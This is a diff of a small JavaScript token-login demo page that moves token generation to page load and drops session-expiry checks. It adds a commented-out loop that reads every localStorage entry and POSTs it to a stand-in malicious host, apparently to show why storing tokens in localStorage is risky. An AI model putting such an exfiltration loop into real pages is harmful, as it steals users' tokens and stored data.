@@ -5,7 +5,7 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-	<title>JWT Cookie Demo</title>
+	<title>Token Demo</title>
 </head>
 <body>
 <h2>Login</h2>
@@ -20,8 +20,25 @@
 <button onclick="logout()">Logout</button>
 
 <script>
+	// console.log(accessToken);
+	// let length = localStorage.length;
+	// for(let i = 0; i < length; i++){
+	// 	let key = localStorage.key(i);
+	// 	let item = localStorage.getItem(key);
+	// 	console.log(key + " : " + item);
+	// 	fetch(`http://dangerouse-site.com?key=${key}&item=${item}`, {
+	// 		method: "POST",
+	// 	});
+	// }
+</script>
+<script>
 	const site = 'http://localhost:8888';
-	let accessToken = '';
+	let accessToken = "";
+	generateToken()
+			.then(token => {
+				accessToken = token;
+				// localStorage.setItem('accessToken', accessToken)
+			});
 
 	async function login(){
 		const res = await fetch(`${site}/auth/login`, {
@@ -44,13 +61,6 @@
 	}
 
 	async function getProfile(){
-		if(!accessToken){
-			accessToken = await generateToken();
-			if(!accessToken){
-				document.getElementById('output').innerText = 'Session expired.';
-				return;
-			}
-		}
 		let res = await fetch(`${site}/profile`, {
 			method: 'GET',
 			headers: {"Authorization": "Bearer " + accessToken}
@@ -87,13 +97,6 @@
 	}
 
 	async function logout(){
-		if(!accessToken){
-			accessToken = await generateToken();
-			if(!accessToken){
-				document.getElementById('output').innerText = 'Session expired.';
-				return;
-			}
-		}
 		let res = await fetch(`${site}/auth/logout`, {
 			method: 'GET',
 			headers: {"Authorization": "Bearer " + accessToken}
